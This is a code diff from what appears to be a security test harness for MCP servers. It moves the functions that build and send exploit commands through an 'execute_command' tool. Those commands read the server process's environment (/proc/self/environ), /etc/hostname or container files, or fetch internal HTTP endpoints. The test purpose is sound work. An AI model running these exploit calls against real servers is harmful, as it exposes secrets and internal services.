@@ -69,6 +69,29 @@ _PREAMBLE = (
 )
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        command = _command_for(places[place_id])
+        await client.call_tool(
+            "execute_command", {"database": DATABASE, "language": "js", "command": command}
+        )
+
+    return run
+
+
+def _command_for(place: Place) -> str:
+    kind = place.kind
+    if kind is PlaceKind.HTTP_ENDPOINT:
+        return _fetch_url_js(f"http://{place.coordinates.host}{place.coordinates.path}")
+    if kind is PlaceKind.ENV:
+        return _read_file_js("/proc/self/environ")  # the server JVM's own environment
+    if kind is PlaceKind.HOSTNAME:
+        return _read_file_js("/etc/hostname")
+    if kind is PlaceKind.FILE:
+        return _read_file_js(resolve_container_path(_file_path(place), WORKDIR))
+    raise ValueError(f"{place.id}: kind {kind} is not reachable by this flaw")
+
+
 def _read_file_js(path: str) -> str:
     return (
         _PREAMBLE
@@ -91,19 +114,6 @@ def _fetch_url_js(url: str) -> str:
     )
 
 
-def _command_for(place: Place) -> str:
-    kind = place.kind
-    if kind is PlaceKind.HTTP_ENDPOINT:
-        return _fetch_url_js(f"http://{place.coordinates.host}{place.coordinates.path}")
-    if kind is PlaceKind.ENV:
-        return _read_file_js("/proc/self/environ")  # the server JVM's own environment
-    if kind is PlaceKind.HOSTNAME:
-        return _read_file_js("/etc/hostname")
-    if kind is PlaceKind.FILE:
-        return _read_file_js(resolve_container_path(_file_path(place), WORKDIR))
-    raise ValueError(f"{place.id}: kind {kind} is not reachable by this flaw")
-
-
 def _file_path(place: Place) -> str:
     coord = place.coordinates
     if coord.path is not None:
@@ -111,16 +121,6 @@ def _file_path(place: Place) -> str:
     if coord.paths:
         return coord.paths[0]
     raise ValueError(f"{place.id}: a file place with no path coordinate")
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        command = _command_for(places[place_id])
-        await client.call_tool(
-            "execute_command", {"database": DATABASE, "language": "js", "command": command}
-        )
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
